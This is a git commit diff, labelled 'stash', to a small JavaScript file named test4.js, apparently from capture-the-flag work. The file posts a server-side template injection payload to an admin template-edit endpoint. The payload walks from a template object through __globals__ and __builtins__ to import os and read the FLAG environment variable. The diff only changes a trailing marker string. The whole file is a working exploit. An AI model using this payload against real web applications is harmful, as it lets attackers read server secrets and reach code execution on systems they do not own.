175c93774ecf26b53928a0582e12a454776c7480
Matěj Volf <git@mvolfik.com>
2026-04-23 08:50:19 +0200

    stash

--- test4.js
+++ test4.js
@@ -1,7 +1,7 @@
 fetch("/admin/templates/1/edit", {
   method: "POST",
   body: "name=Default+Ticket+Template&html_content=" +
-    encodeURIComponent("testaa<h1>{{ event_name }}</h1><p>{{ buyer_name }}</p><p>{{ ticket_code }} {{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}bagrxxxxx</p>") +
+    encodeURIComponent("testaa<h1>{{ event_name }}</h1><p>{{ buyer_name }}</p><p>{{ ticket_code }} {{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}bagrxyz</p>") +
     "&is_default=on",
   headers: {
     "content-type": "application/x-www-form-urlencoded"
